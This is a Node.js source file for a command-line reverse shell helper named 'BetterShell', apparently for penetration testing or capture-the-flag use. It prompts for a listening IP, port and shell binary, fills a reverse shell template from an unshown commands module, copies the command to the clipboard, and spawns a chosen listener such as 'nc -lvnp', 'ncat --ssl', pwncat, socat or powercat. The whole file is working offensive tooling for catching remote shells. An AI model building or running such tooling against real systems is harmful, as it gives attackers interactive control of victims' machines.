#!/usr/bin/env node

import chalk from 'chalk';
import inquirer from 'inquirer';
import inquirerPrompt from 'inquirer-autocomplete-prompt';
import chalkAnimation from 'chalk-animation';
import fuzzy from 'fuzzy';
import os from 'os';
import { spawn } from 'child_process';
import clipboard from 'clipboardy';

import Commands from './commands.js'
const all_commands = Commands()

console.clear()

var interfaces = Object.keys(os.networkInterfaces());
// asyconsole.custom_error = text => console.log(chalk.bgRed.bold(text))
// console.custom_log = text => chalkAnimation.karaoke(text)

var settings = {
	ip: null,
	port: null,
	shell: null,
	shell_type: null,
	listener: null
}

var ip_list = []
interfaces.forEach(net_interface => {
	os.networkInterfaces()[net_interface].forEach(apapter => {
		if (apapter.family == 'IPv4'){
			ip_list.push(apapter.address)
		}

	})
});

var shells = []
var counter = 0;

all_commands.forEach(command => {
	shells.push(`${counter} - ${command.name}`)
	counter++
})

inquirer.registerPrompt('autocomplete', inquirerPrompt);

async function search_shells(_, input = '') {
	return new Promise((resolve) => {
		resolve(fuzzy.filter(input, shells).map((el) => el.original));
	});
}

async function CustomIP() {
	var regex = new RegExp(/^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$/)

	const answers = await inquirer.prompt({
		name: 'option',
		type: 'list',
		message: 'Select ip adress',
		choices: [
			'Network',
			'Custom'
		]
	});
	if (answers.option == 'Custom') {
		const answers = await inquirer.prompt({
			name: 'custom',
			type: 'input',
			message: 'Type ip adress',
		})
		if (!regex.test(answers.custom)){
			console.custom_error("ERROR: Wrong ip format")
			await CustomIP()	
		}
		else settings.ip = answers.custom
	} else {
		await GetIP()
	}

}

async function GetIP() {
	const answers = await inquirer.prompt({
		name: 'ip',
		type: 'list',
		message: 'Select local ip',
		choices: ip_list
	});
	settings.ip = answers.ip
}

async function GetPort() {
	const answers = await inquirer.prompt({
		name: 'port',
		type: 'input',
		message: 'Select port',
		default () {
			return '7007';
		},
	});
	if (isNaN(answers.port)){
		console.custom_error("ERROR: Wrong port must be a number (1-65535)")
		await GetPort()
	}
	if (answers.port > 65535 || answers.port < 1){
		console.custom_error("ERROR: Wrong port must be between 1-65535")
		await GetPort()
	}
	else settings.port = answers.port	
}

async function GetType() {
	const answers = await inquirer.prompt({
		name: 'shell',
		type: 'autocomplete',
		message: 'Select shell',
		source: await search_shells
	});
	var cmd = all_commands[answers.shell.split(' ')[0]].command
	cmd = cmd.replace("{ip}", settings.ip)
	cmd = cmd.replace("{port}", settings.port)
	cmd = cmd.replace("{shell}", settings.shell_type)

	settings.shell = cmd
}

async function GetVersion() {
	const answers = await inquirer.prompt({
		name: 'shell_type',
		type: 'list',
		message: 'Select CLI shell',
		choices: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh']
	});
	settings.shell_type = answers.shell_type
}

async function GetListener() {
	const answers = await inquirer.prompt({
		name: 'listener',
		type: 'list',
		message: 'Select listener',
		choices: [
			'nc -lvnp {port}'.replace('{port}', settings.port),
			'ncat -lvnp {port}'.replace('{port}', settings.port),
			'ncat --ssl -lvnp {port}'.replace('{port}', settings.port),
			'rlwrap -cAr nc -lvnp {port}'.replace('{port}', settings.port),
			'python3 -m pwncat -lp {port}'.replace('{port}', settings.port),
			'stty raw -echo; (stty size; cat) | nc -lvnp {port}'.replace('{port}', settings.port),
			'socat -d -d TCP-LISTEN:{port} STDOUT'.replace('{port}', settings.port),
			'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'.replace('{port}', settings.port),
			'powercat -l -p {port}'.replace('{port}', settings.port),
		]
	});
	settings.listener = answers.listener
}


// console.log(commands)

await CustomIP()
// await GetIP();
await GetPort();
await GetVersion();
await GetType();
await GetListener();


async function SetupShell(settings){
	// console.log(settings)
	console.log(chalk.red.bold(settings.shell))

	clipboard.writeSync(settings.shell);
	console.log(chalk.red.bold('\nCopied shell to clipboard!'))
	var animation = chalkAnimation.rainbow(`BetterShell is listening on ${settings.ip}:${settings.port}`, 0.25)

	//Spawn listener
	spawn(settings.listener, [], {shell: true, detached: true});
	//setTimeout(()=>{
	//	animation.stop()
	//}, 1000)
}

await SetupShell(settings)